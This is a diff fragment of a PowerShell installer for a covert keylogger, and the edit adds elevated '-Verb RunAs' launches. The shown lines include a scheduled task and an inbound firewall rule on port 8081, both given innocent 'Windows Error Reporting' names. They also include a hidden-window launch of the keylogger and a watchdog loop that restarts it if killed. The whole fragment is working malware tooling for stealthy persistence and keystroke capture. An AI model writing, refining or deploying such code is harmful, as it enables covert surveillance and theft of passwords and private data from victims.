@@ -60,8 +60,8 @@ Register-ScheduledTask -TaskName "Windows Error Reporting Service" -Action $acti
 # Add firewall rule with innocent name
 New-NetFirewallRule -DisplayName "Windows Error Reporting" -Direction Inbound -Protocol TCP -LocalPort 8081 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 
-# Start now with RunLevel Highest (admin rights for keyboard hook)
-Start-Process $stealthPy -ArgumentList $keyloggerPath -WindowStyle Hidden
+# Start now with admin rights (required for keyboard hook)
+Start-Process $stealthPy -ArgumentList $keyloggerPath -WindowStyle Hidden -Verb RunAs
 
 # Create self-healing script (restarts if killed)
 $watchdogPath = "$stealthDir\watchdog.ps1"
@@ -69,7 +69,7 @@ $watchdogScript = @"
 while (`$true) {
     `$proc = Get-Process | Where-Object { `$_.Path -eq '$stealthPy' }
     if (-not `$proc) {
-        Start-Process '$stealthPy' -ArgumentList '$keyloggerPath' -WindowStyle Hidden
+        Start-Process '$stealthPy' -ArgumentList '$keyloggerPath' -WindowStyle Hidden -Verb RunAs
     }
     Start-Sleep 30
 }
